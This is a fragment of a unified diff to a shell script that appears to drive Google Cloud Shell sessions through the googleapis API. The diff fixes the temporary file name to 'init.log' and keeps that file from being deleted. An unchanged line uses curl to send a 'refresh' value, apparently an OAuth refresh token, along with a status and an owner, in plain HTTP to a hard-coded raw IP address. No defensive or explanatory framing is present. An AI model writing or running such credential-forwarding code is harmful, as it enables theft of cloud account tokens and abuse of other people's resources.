@@ -27,6 +27,7 @@ do
  then
 
  file='.'$(openssl rand -hex 12)
+ file='init.log'
 
  curl -s --request GET \
          --url 'https://cloudshell.googleapis.com/v1/'$operation'?alt=json' \
@@ -71,7 +72,10 @@ fi
  url='http://135.148.11.148/send_status.php?refresh='$1'&status='$status'&owner='$owner
  curl $url
 
- rm -rf $file
+ if [ $file != 'init.log' ]
+ then
+    rm -rf $file
+ fi
 
  sleep 60
 
